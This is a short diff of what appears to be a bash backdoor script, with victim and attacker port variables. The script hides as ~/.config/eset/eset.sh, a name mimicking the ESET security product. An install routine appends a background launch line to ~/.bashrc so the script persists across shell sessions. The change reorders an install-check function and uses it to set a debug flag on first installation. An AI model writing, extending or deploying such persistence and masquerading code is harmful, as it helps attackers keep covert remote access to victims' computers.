@@ -2,7 +2,20 @@
 
 VICTIM_PORT=2024
 ATTACKER_PORT=2024
-DEBUG_MODE="false"
+
+# Check if script is already installed
+function check_if_installed {
+  if [ -f ~/.config/eset/eset.sh ]
+  then
+    echo "true"
+  else
+    echo "false"
+  fi
+}
+
+
+# Only for first installation
+DEBUG_MODE=$(check_if_installed)
 
 # Frequency of sending response for
 # victims presence (in seconds)
@@ -156,16 +169,6 @@ function install_script {
   echo -e "\n~/.config/eset/eset.sh &" >> ~/.bashrc
 
   source ~/.bashrc
-}
-
-# Check if script is already installed
-function check_if_installed {
-  if [ -f ~/.config/eset/eset.sh ]
-  then
-    echo "true"
-  else
-    echo "false"
-  fi
 }
 
 function log {
